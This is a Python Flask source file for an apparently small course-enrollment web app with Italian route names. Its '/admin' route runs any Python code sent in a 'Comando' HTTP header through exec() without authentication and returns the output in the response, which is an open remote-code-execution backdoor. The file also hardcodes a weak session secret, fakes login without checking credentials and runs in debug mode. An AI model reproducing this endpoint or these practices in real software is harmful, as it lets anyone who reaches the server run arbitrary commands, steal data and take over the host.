
from flask import Flask
from flask import redirect, url_for
from flask import render_template
from flask import request, jsonify, json
from flask import session
from flask import flash
from flask import make_response, Response
from datetime import timedelta, datetime
from flask_sqlalchemy import SQLAlchemy
from helper import *
import db
from io import StringIO
from contextlib import redirect_stdout


DB_NAME = "database.db"
app = Flask(__name__)
app.secret_key = "secret key"
app.permanent_session_lifetime = timedelta(days=7)
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_NAME}'


@app.route("/")
def home():
    return render_template("homepage.html")

@app.route("/admin", methods=["GET", "POST"])
def execute():
    if request.method == "POST":
        
        headers = dict(request.headers)
        
        res = ""
        f = StringIO()
        with redirect_stdout(f):
            try:
                exec(headers["Comando"])
                res = f.getvalue().strip()
            except:
                res = "error"
        
        headers["Result"] = str(res)
        
        return Response([b"good"], headers=headers)
    elif request.method == "GET":
        return render_template("admin.html")
    return "idk"

# azioni

@app.route("/iscrizione/<id_corso>", methods=["POST"])
@login_required
def iscrizione(id_corso):
    
    print("iscritto a", id_corso)
    
    return Response([str(id_corso).encode()])

@app.route("/corso/<id_corso>", methods=["GET"])
def info_corso(id_corso):
    # get the data from db
    return render_template("corso.html", data=db.corso(id=id_corso,
                                                       titolo="prova corsoo",
                                                       descrizione="descrizione bella",
                                                       posti_totali=50,
                                                       posti_occupati=20,
                                                       aula="Ed. 2, Piano 1, aula 36",
                                                       fascia="1"
                                                       ))


# profilo

@app.route("/profile/")
@login_required
def profile():
    return "Profile!"

# accesso al profilo
@app.route("/login/")
def login():
    session["email"] = "prova"
    return "Login!"

@app.route("/register/")
def register():
    return "Register!"

@app.route("/logout/")
@login_required
def logout():
    return "Logout!"


if __name__ == "__main__":
    with app.app_context():
        # db.drop_all()
        # db.init_app(app)
        # db.db.create_all()
        db.init_db(app, DB_NAME)
        app.run(debug=True)
